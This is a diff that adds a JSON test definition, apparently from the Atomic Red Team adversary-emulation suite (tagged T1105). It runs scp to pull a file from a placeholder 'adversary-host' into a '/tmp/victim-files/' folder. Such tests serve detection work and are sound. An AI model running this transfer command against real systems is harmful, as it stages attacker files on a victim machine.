@@ -1,0 +1,50 @@
+{
+  "id": "b9d22b9a-9778-4426-abf0-568ea64e9c33",
+  "name": "scp remote file copy (pull)",
+  "description": "Utilize scp to perform a remote file copy (pull)\n",
+  "platforms": [
+    "linux",
+    "darwin"
+  ],
+  "steps": [
+    {
+      "id": "7f2fef75-055d-465a-a770-80e38c5ea0c8",
+      "type": "execute-command",
+      "data": {
+        "command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_host",
+      "type": "string",
+      "description": "Remote host to copy from",
+      "value": "adversary-host"
+    },
+    {
+      "name": "local_path",
+      "type": "path",
+      "description": "Local path to receive scp",
+      "value": "/tmp/victim-files/"
+    },
+    {
+      "name": "remote_file",
+      "type": "path",
+      "description": "Path of file to copy",
+      "value": "/tmp/adversary-scp"
+    },
+    {
+      "name": "username",
+      "type": "string",
+      "description": "User account to authenticate on remote host",
+      "value": "adversary"
+    }
+  ]
+}
